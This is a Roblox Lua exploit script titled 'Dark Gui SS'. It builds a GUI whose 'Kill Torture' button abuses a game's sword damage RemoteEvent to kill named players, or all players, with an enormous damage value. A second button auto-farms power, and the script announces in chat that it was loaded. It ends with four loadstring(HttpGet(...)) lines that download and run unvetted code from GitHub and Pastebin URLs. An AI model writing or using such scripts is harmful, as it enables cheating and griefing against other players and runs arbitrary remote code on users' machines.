--Made By ScriptLiner And Lua–-

--//-- DETECTION --\\--

if game:GetService("CoreGui"):FindFirstChild("Dankity") then game:GetService("CoreGui").Dankity:Destroy() end



--//-- VARIABLES --\\--

Dankity = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer.PlayerGui)

Main = Instance.new("Frame", Dankity) Header = Instance.new("Frame", Main) Text = Instance.new("TextLabel", Header) Username = Instance.new("TextBox", Main) Kill = Instance.new("TextButton", Main) Power = Instance.new("TextButton", Main) LocalPlayer = game:GetService("Players").LocalPlayer Backpack = LocalPlayer.Backpack Character = LocalPlayer.Character
Humanoid = Character.Humanoid

--//-- PROPERTIES --\\--

Dankity.Name = "Dankity"

Dankity.ResetOnSpawn = false

Main.Name = "Main"

Main.BackgroundColor3 = Color3.new(0, 0, 0)

Main.BorderSizePixel = 0

Main.Active = true

Main.Draggable = true

Main.Selectable = true

Main.Position = UDim2.new(0.321995467, 0, 0.22910662, 0)

Main.Size = UDim2.new(0, 471, 0, 375)

Header.Name = "Header"

Header.BackgroundColor3 = Color3.new(128,0,128)

Header.BorderSizePixel = 0

Header.Position = UDim2.new(0, 0, 0.0613333359, 0)

Header.Size = UDim2.new(0, 471, 0, 64)

Text.Name = "Text"

Text.BackgroundColor3 = Color3.new(128,0,128)

Text.BackgroundTransparency = 1

Text.Position = UDim2.new(0.165605083, 0, 0.102874994, 0)

Text.Size = UDim2.new(0, 315, 0, 50)

Text.Font = Enum.Font.SourceSansBold

Text.Text = "Dark Gui SS "

Text.TextColor3 = Color3.new(0, 0, 0)

Text.TextSize = 30

Username.Name = "Username"

Username.BackgroundColor3 = Color3.new(128,0,128)

Username.BorderSizePixel = 0

Username.Position = UDim2.new(0.17622079, 0, 0.346666723, 0)

Username.Size = UDim2.new(0, 305, 0, 50)

Username.Font = Enum.Font.SourceSansSemibold

Username.Text = "Username/Displays Dont Work!"

Username.TextColor3 = Color3.new(0, 0, 0)

Username.TextSize = 20

Kill.Name = "Kill"

Kill.BackgroundColor3 = Color3.new(128,0,128)

Kill.BorderSizePixel = 0

Kill.Position = UDim2.new(0.282377899, 0, 0.519999981, 0)

Kill.Size = UDim2.new(0, 200, 0, 50)

Kill.Font = Enum.Font.SourceSansSemibold

Kill.Text = "Kill Torture"

Kill.TextColor3 = Color3.new(0, 0, 0)

Kill.TextSize = 20

Kill.TextWrapped = true

Power.Name = "Power"

Power.BackgroundColor3 = Color3.new(128,0,128)

Power.BorderSizePixel = 0

Power.Position = UDim2.new(0.282377899, 0, 0.685333312, 0)

Power.Size = UDim2.new(0, 200, 0, 50)

Power.Font = Enum.Font.SourceSansSemibold

Power.Text = "Dark Power Farm Click For More Power!"

Power.TextColor3 = Color3.new(0, 0, 0)

Power.TextSize = 20

Power.TextWrapped = true

--//-- FUNCTIONS --\\--

function GetPlayers(Name)

if Name:lower() == "me" then

return {Player}

elseif Name:lower() == "all" then

return game:GetService("Players"):GetPlayers()

elseif Name:lower() == "others" then

local t = {}

for i, v in pairs(game:GetService("Players"):GetPlayers()) do if v.Name ~= Player.Name then t[#t+1] = v

end

end

return t

else

local t = {}

for i, v in pairs(game:GetService("Players"):GetPlayers()) do

if v.Name:sub(1, #Name):lower() == Name:lower() then

t[#t+1] = v

end

end

return t

end

end

--//-- SCRIPTING --\\--

Kill.MouseButton1Click:Connect(function()

for _,v in pairs(Backpack:GetChildren()) do

Humanoid:EquipTool(v)

end

local Plrs = GetPlayers(Username.Text)

for i,v in pairs(Plrs) do

for i = 1 , 10 do

if Character:FindFirstChild("sword") then

Character.sword.Handle.dmg.RemoteEvent:FireServer(game:GetService("Workspace")[v.Name

].Humanoid, 9999999999999999999999)

end

end

end

end)

Power.MouseButton1Click:Connect(function()

for _,v in pairs(Backpack:GetChildren()) do

Humanoid:EquipTool(v)

end

if Character:FindFirstChild("sword") then

while wait() do

Character.sword.Handle.up.RemoteEvent:FireServer()

if not Character:FindFirstChild("sword") then

for _,v in pairs(Backpack:GetChildren()) do

Humanoid:EquipTool(v)

end

end

end

end

end)

local A_1 = game.Players.LocalPlayer.name.." Loaded Dark Gui SS (Paid)"-----message here

local A_2 = "All"

local Event =

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
                                       ----- Admin Script -------

loadstring(game:HttpGet(("https://raw.githubusercontent.com/ZenexGT/23kLua-AdminV2/main/SS%20Admin"), true))()

--creator:Suki
                          ------WS2 FARM----------- 
loadstring(game:HttpGet(("https://raw.githubusercontent.com/ZenexGT/weapon-sim-2-farm/main/Ws2%20farm"), true))()

--creator: Suki And Wolve
                                     ----- ORPOBY GUI SCRIPT ------
loadstring(game:HttpGet(("https://raw.githubusercontent.com/icuck/Sword-Simulator-GUI/master/main.lua"), true))()

--creator:orpoby
                                           ------------ Admin V2 -----------
loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK",true))();
